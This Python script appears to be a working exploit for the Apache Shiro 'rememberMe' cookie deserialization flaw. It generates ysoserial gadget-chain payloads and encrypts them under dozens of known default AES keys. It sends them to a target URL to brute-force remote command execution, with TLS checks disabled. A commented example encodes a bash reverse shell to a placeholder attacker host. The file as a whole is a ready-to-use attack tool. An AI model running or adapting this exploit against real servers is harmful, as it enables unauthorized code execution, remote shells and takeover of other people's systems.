import sys
import os
import uuid
import base64
import subprocess
import requests
import urllib3
import argparse

from Crypto.Cipher import AES


# disable ssl warning for self signed certificate
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

JAR_FILE = 'ysoserial.jar'

KEYS = (
    'kPH+bIxk5D2deZiIxcaaaA==',
    '2AvVhdsgUs0FSA3SDFAdag==',
    '1QWLxg+NYmxraMoxAXu/Iw==',
    '4AvVhmFLUs0KTA3Kprsdag==',
    '6ZmI6I2j3Y+R1aSn5BOlAA==',
    '7AvVhmFLUs0KTA3Kprsdag==',
    'Z3VucwAAAAAAAAAAAAAAAA==',
    'RVZBTk5JR0hUTFlfV0FPVQ==',
    'r0e3c16IdVkouZgk1TKVMg==',
    'ZUdsaGJuSmxibVI2ZHc9PQ==',
    'bWljcm9zAAAAAAAAAAAAAA==',
    'MTIzNDU2Nzg5MGFiY2RlZg==',
    '2adsfasdqerqerqewradsf==',
    'ZAvph3dsQs0FSL3SDFAdag==',
    '3AvVhmFLUs0KTA3Kprsdag==',
    '66v1O8keKNV3TTcGPK1wzg==',
    '5aaC5qKm5oqA5pyvAAAAAA==',
    'wGiHplamyXlVB11UXWol8g==',
    'V2hhdCBUaGUgSGVsbAAAAA==',
    'bWluZS1hc3NldC1rZXk6QQ==',
    'vXP33AonIp9bFwGl7aT7rA==',
    '4AvVhmFLUs5KTA1Kprsdag==',
    'ZnJlc2h6Y24xMjM0NTY3OA==',
    'WcfHGU25gNnTxTlmJMeSpw==',
    'mIccZhQt6EBHrZIyw1FAXQ==',
    'QF5HMyZAWDZYRyFnSGhTdQ==',
    '9E9uBV19JjhIVjsOA+5vqQ==',
    'AztiX2RUqhc7dhOzl1Mj8Q==',
    'OY//C4rhfwNxCQAQCrQQ1Q==',
    'YystomRZLMUjiK0Q1+LFdw==',
    'bXRvbnMAAAAAAAAAAAAAAA==',
    'Q01TX0JGTFlLRVlfMjAxOQ==',
    'L7RioUULEFhRyxM7a2R/Yg==',
    'U3BAbW5nQmxhZGUAAAAAAA==',
    'fCq+/xW488hMTCD+cmJ3aQ==',
    '5AvVhmFLUs0KTA3Kprsdag==',
    'cmVtZW1iZXJNZQAAAAAAAA==',
    'WkhBTkdYSUFPSEVJX0NBVA==',
    'c2hpcm9fYmF0aXMzMgAAAA==',
    '1AvVhdsgUs0FSA3SDFAdag==',
    'MTIzNDU2NzgxMjM0NTY3OA==',
    'U3ByaW5nQmxhZGUAAAAAAA==',
    '6ZmI6I2j5Y+R5aSn5ZOlAA==',
    'wrjUh2ttBPQLnT4JVhriug==',
    'yeAAo1E8BOeAYfBlm4NG9Q==',
    'a2VlcE9uR29pbmdBbmRGaQ=='
)

GADGETS = (
    'CommonsBeanutils1',
    'CommonsCollections1',
    'CommonsCollections2',
    'CommonsCollections3',
    'CommonsCollections4',
    'CommonsCollections5',
    'CommonsCollections6',
    'CommonsCollections7',
    'CommonsCollections8',
    'CommonsCollections9',
    'CommonsCollections10'
)


def get_command(command):
    # command = 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC92cHNfaXAvcG9ydCAwPiYx}|{base64,-d}|{bash,-i}'
    # command encode http://www.jackson-t.ca/runtime-exec-payloads.html

    base64_command = str(base64.b64encode(bytes(command, encoding='utf-8')), encoding='utf-8')
    encoded_command = 'bash -c {echo,' + base64_command + '}|{base64,-d}|{bash,-i}'

    return encoded_command


def get_payload(command, gadget, key):
    if not os.path.exists(JAR_FILE):
        raise Exception('ysoserial.jar not found!')

    popen = subprocess.Popen(['java', '-jar', JAR_FILE, gadget, command], stdout=subprocess.PIPE)

    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    raw_payload = pad(popen.stdout.read())
    payload = base64.b64encode(iv + encryptor.encrypt(raw_payload))

    return payload


def send_payload(url, payload):
    headers = {
        'User-agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;'
    }

    cookies = {
        'rememberMe': payload.decode()
    }

    try:
        res = requests.get(url, headers=headers, cookies=cookies, timeout=30, verify=False)
    except Exception as e:
        print(e)
        return False

    return res


def scan(url, command, gadget='', key='', flag=''):
    if gadget == '':
        scan_gadgets = GADGETS
    else:
        scan_gadgets = (gadget,)

    if key == '':
        scan_keys = KEYS
    else:
        scan_keys = (key,)

    for gadget in scan_gadgets:
        for key in scan_keys:
            if command.find(flag) != -1:
                new_command = command.replace(flag, f'{gadget}{key}')

            encoded_command = get_command(new_command)
            payload = get_payload(encoded_command, gadget, key)
            res = send_payload(url, payload)
            print(f'{gadget} {key} {new_command} code: {res.status_code}')


def get_parser():
    parser = argparse.ArgumentParser()

    parser.add_argument('-u', '--url', type=str, required=True, help='target url')
    parser.add_argument('-c', '--command', type=str, required=True, help='execute command')
    parser.add_argument('-g', '--gadget', required=False, default='', help='gadget')
    parser.add_argument('-k', '--key', required=False, default='', help='aes key')
    parser.add_argument('-f', '--flag', required=False, default='', help='flag')

    return parser


if __name__ == '__main__':

    parser = get_parser()
    args = parser.parse_args()

    scan(args.url, args.command, args.gadget, args.key, args.flag)
